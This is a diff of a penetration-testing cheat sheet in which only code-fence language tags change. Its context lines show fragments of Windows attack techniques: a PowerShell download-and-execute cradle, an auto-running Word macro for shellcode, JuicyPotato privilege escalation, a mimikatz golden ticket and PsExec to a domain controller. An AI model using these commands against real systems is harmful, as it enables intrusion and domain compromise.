@@ -157,7 +157,7 @@ powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadS
 Create a python server and get it from the linux machine:
 
 On windows:
-```cmd
+```sh
 python -m SimpleHTTPServer 80
 ```
 On linux:
@@ -250,7 +250,7 @@ Next create a new macro and copy-paste the file into the macro
 
 Finally create a word macro and past the shell code in like so:
 
-```vbscript
+```sh
 Sub AutoOpen()
     MyMacro
 End Sub
@@ -439,7 +439,7 @@ juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {e60687f7-01a1-40
 
 ##### sc.exe
 
-```cmd
+```sh
 sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
 
 FOR /F %i in (Servicenames.txt) DO echo %i
@@ -771,7 +771,7 @@ mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-403895
 
 Now we can launch a command prompt on the domain controller using `psexec` like so:
 
-```cmd
+```sh
 C:\Windows\system32>cd C:\Tools\active_directory
 
 C:\Tools\active_directory>PsExec.exe \\dc01 cmd.exe
